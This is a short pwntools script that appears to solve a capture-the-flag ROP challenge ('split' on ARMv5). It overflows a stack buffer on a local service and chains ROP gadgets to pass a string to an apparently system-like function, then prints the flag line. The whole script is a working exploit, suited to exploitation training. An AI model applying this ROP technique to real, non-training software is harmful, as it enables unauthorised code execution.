from pwn import *

BINARY = "./split_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY



p = remote("0.0.0.0", 8888)
pause()
rop = b"A" * 0x24
rop += p32(0x00010658) # POP     {R3,PC}
rop += p32(0x0002103C)   # 字符串地址
rop += p32(0x00010558)  # mov r0, r3 ; pop {fp, pc}

rop += b"AAAA"
rop += p32(0x000103EC)

p.recvuntil(b"> ")
p.sendline(rop)
print(p.recvline_contains(b"ROPE"))